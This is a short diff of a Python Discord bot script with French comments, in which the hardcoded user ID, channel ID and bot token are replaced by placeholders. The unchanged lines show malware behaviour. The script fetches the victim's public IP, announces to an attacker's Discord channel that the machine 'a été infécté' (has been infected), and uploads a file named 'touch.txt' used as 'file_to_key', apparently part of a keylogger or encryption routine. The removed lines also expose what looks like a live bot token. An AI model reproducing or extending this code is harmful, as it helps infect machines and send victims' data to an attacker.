@@ -18,10 +18,10 @@ ip = get('https://api.ipify.org').text
 #Dés que le bot a fini de s'initier
 @bot.event
 async def on_ready():
-    print('Connecté en tant que {0}!'.format(bot.get_user(842850355490062337)))
+    print('Connecté en tant que {0}!'.format(bot.get_user("your channel")))
 
     #On focus un channel dans un serveur discord
-    channel = bot.get_channel(842871956995178499)
+    channel = bot.get_channel("your channel")
     await channel.send('L\'IP : ' + ip + " a été infécté")
     await channel.send(file=discord.File('touch.txt'))
     file_to_key = "touch.txt"
@@ -38,7 +38,7 @@ async def on_ready():
 
 
 #Token où le bot va s'initialiser
-bot.run('ODQyODUwMzU1NDkwMDYyMzM3.YJ7TkA.u7amPLHQTuAhYrtZRuBYrFv1ijs')
+bot.run('your token')
 
 
 
